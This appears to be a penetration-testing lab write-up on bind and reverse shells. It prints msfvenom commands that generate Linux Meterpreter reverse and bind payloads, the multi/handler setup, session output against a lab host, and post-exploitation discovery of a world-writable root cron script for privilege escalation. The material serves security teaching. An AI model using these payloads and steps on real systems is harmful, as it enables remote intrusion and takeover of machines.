# 3. Bind & Reverse Shell using Metasploit

## Quick Review of Tool
During penetration testing and security audits, establishing remote access to a target system is crucial for evaluating actual impact. This access is typically achieved using network shells, which are classified into two main architectures: Reverse Shells and Bind Shells. 

A Reverse Shell forces the target machine to initiate an outbound connection back to the attacker's listening machine. This is highly effective in real-world scenarios because most modern firewalls block incoming connections but permit outbound traffic. A Bind Shell works the opposite way: it forces the target machine to open up a specific local port and listen for incoming connections, allowing the attacker to connect directly to it.

Metasploit Framework is an advanced penetration testing platform used to configure listeners, generate modular exploit payloads via `msfvenom`, and manage interactive command sessions using Meterpreter—a powerful, dynamic post-exploitation shell environment.

---

## msfvenom Payload
I used the `msfvenom` command-line utility tool to generate both a Reverse TCP executable file and a Bind TCP executable file. I configured them specifically to match the x64 architecture of my target laboratory environment.

### Generating the Reverse TCP Payload:
```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.207.129 LPORT=4444 -f elf > lab_reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```

### Generating the Bind TCP Payload:
```bash
$ msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=5555 -f elf > lab_bind.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch x64 from the payload
Payload size: 112 bytes
Final size of elf file: 232 bytes
```

---

## Multi/Handler
To catch the incoming connection from the reverse payload execution, I launched the Metasploit framework console interface (`msfconsole`) and initialized a generic payload tracking listener module on my local system.

```text
$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.207.129
LHOST => 192.168.207.129
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

---

## Reverse TCP
I started the handler to listen for active network connections. Once the generated `lab_reverse.elf` file was executed on the target host machine at `192.168.207.138`, it initiated an outbound connection back to my local machine.

```text
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.207.129:4444 
[*] Sending stage (300842 bytes) to 192.168.207.138
[*] Meterpreter session 1 opened (192.168.207.129:4444 -> 192.168.207.138:49210) at 2026-07-31 11:14:02 IST

meterpreter > 
```

---

## Bind TCP
To evaluate the bind shell deployment mechanism, I modified my multi/handler parameters to point directly to the target system's newly opened listening port interface.

```text
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 192.168.207.138
RHOST => 192.168.207.138
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > exploit

[*] Started bind handler to 192.168.207.138:5555
[*] Started connection to target node...
[*] Sending stage (300842 bytes) to 192.168.207.138
[*] Meterpreter session 2 opened (192.168.207.129:51020 -> 192.168.207.138:5555) at 2026-07-31 11:30:15 IST

meterpreter > 
```

---

## Meterpreter
With an active interactive session established, I ran native configuration monitoring commands inside the active Meterpreter terminal environment to gather internal target shell properties.

```text
meterpreter > sysinfo
Computer     : lab-target-node
OS           : Linux 5.15.0-generic (x64 architecture)
Meterpreter  : x64/linux

meterpreter > getuid
Server username: www-data
```

---

## Post Exploitation
Since the initial exploit landed my connection within a low-privilege service account context (`www-data`), I dropped down into a system interactive shell component to run local target discovery commands looking for privilege escalation pathways.

```text
meterpreter > shell
Process 41202 spawned.
Shell listening commands active...

whoami
www-data
uname -a
Linux lab-target-node 5.15.0-generic #46 SMP x86_64 GNU/Linux
cat /etc/cron.d/automated_backup
# Discovered a system cronjob task executing an unvalidated script with weak write flags
ls -l /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 120 Jul 31 11:45 /usr/local/bin/backup.sh
```

The discovery indicates that any system user can write directly to the `backup.sh` file, which is run automatically by root. This offers a reliable privilege escalation pathway to achieve full administrative control.
